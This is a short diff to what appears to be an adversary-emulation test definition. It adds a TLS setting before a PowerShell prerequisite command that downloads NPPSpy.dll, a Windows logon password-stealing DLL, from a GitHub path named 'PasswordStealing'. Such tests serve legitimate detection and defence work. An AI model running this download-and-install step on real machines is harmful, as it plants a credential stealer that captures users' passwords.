@@ -61,6 +61,7 @@ atomic_tests:
   - description: NPPSpy.dll must be available in local temp directory 
     prereq_command: if (Test-Path "$env:Temp\NPPSPY.dll") {exit 0} else {exit 1}
     get_prereq_command: |-
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "$env:Temp\NPPSPY.dll"
   executor:
     command: |-
